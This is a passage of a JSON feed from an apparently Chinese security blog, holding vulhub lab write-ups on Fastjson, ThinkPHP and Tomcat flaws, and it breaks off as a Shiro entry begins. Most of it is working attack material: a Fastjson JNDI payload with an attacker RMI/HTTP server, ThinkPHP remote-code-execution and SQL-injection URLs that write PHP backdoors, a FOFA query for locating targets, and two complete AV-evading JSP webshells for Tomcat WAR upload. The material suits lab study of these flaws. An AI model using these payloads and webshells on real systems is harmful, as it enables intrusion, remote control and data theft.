class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvvp 7777</span><br><span class=\"line\">python -m http.server 5555</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202024134.png\" alt=\"image-20240425202024134\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202135914.png\" alt=\"image-20240425202135914\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202210491.png\" alt=\"image-20240425202210491\"></p>\n<p>然后BP抓包，修改POST方法，修改Content-Type，修改payload发送</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 272</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;a&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class=\"line\">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;b&quot;:&#123;</span><br><span class=\"line\">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class=\"line\">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class=\"line\">        &quot;autoCommit&quot;:true</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202527880.png\" alt=\"image-20240425202527880\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202511365.png\" alt=\"image-20240425202511365\"></p>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Bossfrank/article/details/130100893\">https://blog.csdn.net/Bossfrank/article/details/130100893</a></p>\n<p><a href=\"https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html\">https://www.cnblogs.com/letthink/p/16153248.html#/c/subject/p/16153248.html</a></p>\n<p><a href=\"https://blog.csdn.net/huayimy/article/details/130273362\">https://blog.csdn.net/huayimy/article/details/130273362</a></p>\n<p><a href=\"https://www.cnblogs.com/karsa/p/15983486.html\">https://www.cnblogs.com/karsa/p/15983486.html</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】ThinkPHP漏洞复现",
            "date_published": "2024-04-24T16:11:39.373Z",
            "content_html": "<h1 id=\"【vulhub】ThinkPHP漏洞复现\"><a href=\"#【vulhub】ThinkPHP漏洞复现\" class=\"headerlink\" title=\"【vulhub】ThinkPHP漏洞复现\"></a>【vulhub】ThinkPHP漏洞复现</h1><p>​\tPHP框架是许多代码的集合，这些代码是程序结构的代码(并不是业务代码)，代码中有许多函数、类、功能类包，框架的代码按照一定标准组成了一个有机的功能体，这个功能体中有许多设计模式如MVC、单例、AR等。<br>​\tThinkPHP是一个快速、兼容而且简单的轻量级国产PHP开发框架，遵循Apache2开源协议发布，从Struts结构移植过来并做了改进和完善，是一个轻量级框架，内部OOP和面向过程代码都存在，是国人自己开发的框架。同时也借鉴了国外很多优秀的框架和模式，使用面向对象的开发结构和MVC模式，融合了Struts的思想和TagLib、RoR的ORM映射和ActiveRecord模式。</p>\n<h1 id=\"2-rce\"><a href=\"#2-rce\" class=\"headerlink\" title=\"2-rce\"></a>2-rce</h1><h2 id=\"漏洞原理：\"><a href=\"#漏洞原理：\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP 2.x版本中，使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$res</span> = <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"string\">&#x27;@(\\w+)&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;([^&#x27;</span>.<span class=\"variable\">$depr</span>.<span class=\"string\">&#x27;\\/]+)@e&#x27;</span>, <span class=\"string\">&#x27;$var[\\&#x27;\\\\1\\&#x27;]=&quot;\\\\2&quot;;&#x27;</span>, <span class=\"title function_ invoke__\">implode</span>(<span class=\"variable\">$depr</span>,<span class=\"variable\">$paths</span>));</span><br></pre></td></tr></table></figure>\n\n<p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p>\n<p>ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。</p>\n<p>具体原理过程参考文章：<a href=\"https://www.freebuf.com/sectool/223149.html%EF%BC%88%E5%BC%BA%E7%83%88%E6%8E%A8%E8%8D%90%E7%9C%8B%E5%AE%8C%EF%BC%81%EF%BC%89\">https://www.freebuf.com/sectool/223149.html（强烈推荐看完！）</a></p>\n<h2 id=\"漏洞复现：\"><a href=\"#漏洞复现：\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>根据对漏洞原理的理解，构造payload，获取phpinfo信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170222558.png\" alt=\"image-20240424170222558\"></p>\n<p>构造payload，配合蚁剑等工具进行连接，获取shell</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=a/b/c/$&#123;@print(eval($_POST[sqrt7]))&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170623602.png\" alt=\"image-20240424170623602\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424170654949.png\" alt=\"image-20240424170654949\"></p>\n<h1 id=\"5-0-23-rce\"><a href=\"#5-0-23-rce\" class=\"headerlink\" title=\"5.0.23-rce\"></a>5.0.23-rce</h1><h2 id=\"漏洞原理：-1\"><a href=\"#漏洞原理：-1\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>\n<p>实现框架的核心类Requests的method方法实现表单请求类伪装，默认为$_POST[‘_method’]变量，却没有对_method属性进行严格校验，可以通过变量覆盖Requests类的属性，在结合框架特性实现对任意函数的调用实现任意代码执行</p>\n<p> 影响版本</p>\n<p>ThinkPHP 5.0.x<del>5.0.23<br>ThinkPHP 5.1.x</del>5.1.31<br>ThinkPHP 5.2.0beta1</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://blog.csdn.net/solitudi/article/details/113796433\">https://blog.csdn.net/solitudi/article/details/113796433</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-1\"><a href=\"#漏洞复现：-1\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>BP抓包修改数据，执行命令，获取信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?s=captcha</span><br><span class=\"line\"></span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-24%20191819.png\" alt=\"屏幕截图 2024-04-24 191819\"></p>\n<p>尝试创建后门，利用蚁剑进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?s=captcha</span><br><span class=\"line\"></span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;&lt;?php @eval(\\$_POST[sqrt7])?&gt;&quot; &gt;&gt; sqrt.php</span><br><span class=\"line\">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWzEyM10pPz4=&quot;|base64 -d &gt;&gt; sqrt.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424192934769.png\" alt=\"image-20240424192934769\"></p>\n<h1 id=\"5-rce\"><a href=\"#5-rce\" class=\"headerlink\" title=\"5-rce\"></a>5-rce</h1><h2 id=\"漏洞原理：-2\"><a href=\"#漏洞原理：-2\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>\n<p>影响版本</p>\n<p>ThinkPHP5:<br>5.0.x<del>5.0.23；<br>5.1.0</del>5.1.30；<br>不同版本payload不同， 5.1.13之后还与debug模式有关</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://www.freebuf.com/articles/web/289860.html\">https://www.freebuf.com/articles/web/289860.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-2\"><a href=\"#漏洞复现：-2\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>构造payload，执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br><span class=\"line\"></span><br><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230451281.png\" alt=\"image-20240424230451281\"></p>\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424230509901.png\" alt=\"image-20240424230509901\"></p>\n<p>尝试写入后门木马进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134:8080/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][1]=&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">payload解释：调用file_put_contents方法将&#x27;&lt;?php phpinfo();eval($_REQUEST[7]);?&gt;&#x27;写入shell.php文件</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424231120979.png\" alt=\"image-20240424231120979\"></p>\n<h1 id=\"in-sqlinjection\"><a href=\"#in-sqlinjection\" class=\"headerlink\" title=\"in-sqlinjection\"></a>in-sqlinjection</h1><h2 id=\"漏洞原理：-3\"><a href=\"#漏洞原理：-3\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</p>\n<p>传入的某参数在绑定编译指令的时候又没有安全处理，预编译的时候导致SQL异常报错。然而thinkphp5默认开启debug模式，在漏洞环境下构造错误的SQL语法会泄漏数据库账户和密码。</p>\n<p>重点还是在于通过敏感信息泄露进一步的利用，sql注入漏洞起到的作用只体现在爆出敏感信息。</p>\n<p>影响版本<br>ThinkPHP &lt; 5.1.23<br>该漏洞的形成最关键一点是需要开启debug模式</p>\n<p>具体原理参考文章：（需要一定的基础）</p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html\">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<h2 id=\"漏洞复现：-3\"><a href=\"#漏洞复现：-3\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134/index.php?ids[]=1&amp;ids[]=2</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424234654144.png\" alt=\"image-20240424234654144\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://192.168.100.134/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240424235410605.png\" alt=\"image-20240424235410605\"></p>\n<h1 id=\"lang-rce\"><a href=\"#lang-rce\" class=\"headerlink\" title=\"lang-rce\"></a>lang-rce</h1><h2 id=\"漏洞原理：-4\"><a href=\"#漏洞原理：-4\" class=\"headerlink\" title=\"漏洞原理：\"></a>漏洞原理：</h2><p>ThinkPHP是一个在中国使用较多的PHP框架。在其6.0.13版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用lang参数来包含任意PHP文件。</p>\n<p>虽然只能包含本地PHP文件，但在开启了register_argc_argv且安装了pcel&#x2F;pear的环境下，可以包含&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php并写入任意文件。</p>\n<p>影响版本：</p>\n<p>6.0.1 &lt; ThinkPHP≤ 6.0.13</p>\n<p>5.0.0 &lt; ThinkPHP≤ 5.0.12</p>\n<p>5.1.0 &lt; ThinkPHP≤ 5.1.8</p>\n<p><strong>利用条件：</strong></p>\n<p>1、需要Thinkphp开启多语言功能</p>\n<p>2、安装pear扩展</p>\n<p>3、知道pearcmd.php路径</p>\n<p>4、register_argc_argv&#x3D;on</p>\n<h2 id=\"漏洞复现：-4\"><a href=\"#漏洞复现：-4\" class=\"headerlink\" title=\"漏洞复现：\"></a>漏洞复现：</h2><p>进行漏洞验证</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();?&gt;+shell.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091852033.png\" alt=\"image-20240425091852033\"></p>\n<p>传入后门木马，进行连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/index.php?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo();eval($_REQUEST[7]);?&gt;+sqrt.php</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91ThinkPHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425091917700.png\" alt=\"image-20240425091917700\"></p>\n<p><strong>FOFA搜索语法：</strong></p>\n<blockquote>\n<p>header&#x3D;”think_lang”</p>\n</blockquote>\n<p>参考文章：</p>\n<p><a href=\"https://blog.csdn.net/Yeoman92/article/details/53064670\">https://blog.csdn.net/Yeoman92/article/details/53064670</a></p>\n<p><a href=\"https://www.freebuf.com/sectool/223149.html\">https://www.freebuf.com/sectool/223149.html</a></p>\n<p><a href=\"https://blog.csdn.net/solitudi/article/details/113796433\">https://blog.csdn.net/solitudi/article/details/113796433</a></p>\n<p><a href=\"https://blog.csdn.net/qq_58873970/article/details/132711738\">https://blog.csdn.net/qq_58873970/article/details/132711738</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/289860.html\">https://www.freebuf.com/articles/web/289860.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html\">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>\n<p><a href=\"https://blog.csdn.net/qq_51922767/article/details/126859373\">https://blog.csdn.net/qq_51922767/article/details/126859373</a></p>\n<p><a href=\"https://blog.csdn.net/weixin_42253265/article/details/111593955\">https://blog.csdn.net/weixin_42253265/article/details/111593955</a></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "url": "https://w-sqrt7.github.io/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/",
            "title": "【vulhub】Tomcat漏洞复现",
            "date_published": "2024-04-24T02:46:27.742Z",
            "content_html": "<h1 id=\"【vulhub】Tomcat漏洞复现\"><a href=\"#【vulhub】Tomcat漏洞复现\" class=\"headerlink\" title=\"【vulhub】Tomcat漏洞复现\"></a>【vulhub】Tomcat漏洞复现</h1><p>​\tTomcat是一个开源的、轻量级的应用服务器，是Apache软件基金会的一个项目。它实现了Java Servlet、JavaServer Pages（JSP）和 Java Expression Language（EL）等Java技术，用于支持在Java平台上运行的动态Web应用程序。Tomcat的全名是Apache Tomcat。</p>\n<p>​\tTomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat大都是java代码写的，所以他依赖于java的JDK环境。</p>\n<h1 id=\"Tomcat8\"><a href=\"#Tomcat8\" class=\"headerlink\" title=\"Tomcat8\"></a>Tomcat8</h1><h2 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h2><p>Tomcat7+ 弱口令 &amp;&amp; 后台getshell漏洞</p>\n<p>Tomcat版本：8.0</p>\n<p>环境说明</p>\n<p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>\n<p>Tomcat7+权限分为：</p>\n<ul>\n<li>manager（后台管理）<ul>\n<li>manager-gui 拥有html页面权限</li>\n<li>manager-status 拥有查看status的权限</li>\n<li>manager-script 拥有text接口的权限，和status权限</li>\n<li>manager-jmx 拥有jmx权限，和status权限</li>\n</ul>\n</li>\n<li>host-manager（虚拟主机管理）<ul>\n<li>admin-gui 拥有html页面权限</li>\n<li>admin-script 拥有text接口权限</li>\n</ul>\n</li>\n</ul>\n<p>​\twar包是用来进行Web开发时一个网站项目下的所有代码,包括前台HTML&#x2F;CSS&#x2F;JS代码,以及后台JavaWeb的代码。 当开发人员开发完毕时,就会将源码打包给测试人员测试,测试完后若要发布则也会打包成War包进行发布。War包 可以放在Tomcat下的webapps或word目录,当Tomcat服务器启动时，War包即会随之解压源代码来进行自动部署。</p>\n<h2 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h2><p>首先尝试利用弱口令（tomcat:tomcat）登录到后台，登入后台可以发现一个文件上传点，用于上传war包的，以此为基础，文件上传后门木马进行连接</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1.png\" alt=\"1\"></p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/11.png\" alt=\"11\"></p>\n<p>需要准备好恶意代码，要免杀处理后的木马</p>\n<p>如冰蝎可以连接成功的木马（.jsp）（密码rebeyond）（蚁剑无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如蚁剑可以连接成功的木马（.jsp）（密码passwd）（冰蝎无法连接该木马，原因未了解）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%!</span><br><span class=\"line\">    class U extends ClassLoader &#123;</span><br><span class=\"line\">        U(ClassLoader c) &#123;</span><br><span class=\"line\">            super(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public Class g(byte[] b) &#123;</span><br><span class=\"line\">            return super.defineClass(b, 0, b.length);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class=\"line\">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class=\"line\">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class=\"line\">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    String cls = request.getParameter(&quot;passwd&quot;);</span><br><span class=\"line\">    if (cls != null) &#123;</span><br><span class=\"line\">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>将木马压缩为.zip文件，然后再将文件后缀更改为.war后进行上传，观察发现上传成功（这里就先上传一个简单的一句话php木马）</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2.png\" alt=\"2\"></p>\n<p>进入对应目录查看，可以发现刚才上传的一句话木马被处理掉了，也就无法正常进行连接，所以需要进行免杀处理。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3.png\" alt=\"3\"></p>\n<p>这次上传蚁剑可以连接的木马进行同上的操作后上传，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/4.png\" alt=\"4\"></p>\n<p>同样，也可以上传一个冰蝎可以连接的木马，并尝试连接，发现可以连接成功。</p>\n<p><img src=\"/2024/04/24/vulhub/%E3%80%90vulhub%E3%80%91Tomcat%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5.png\" alt=\"5\"></p>\n",
            "tags": [
                "原创",
                "靶场",
                "vulhub"
            ]
        },
        {
            "id": "https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "url": "https://w-sqrt7.github.io/2024/04/18/vulhub/%E3%80%90vulhub%E3%80%91Apache%20Shiro%201.2.4%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-4437%EF%BC%89/",
            "title": "【vulhub】Apache Shiro 1.2.4反序列化漏洞（CVE-2016-4437）",
            "date_published": "2024-04-18T15:31:13.077Z",
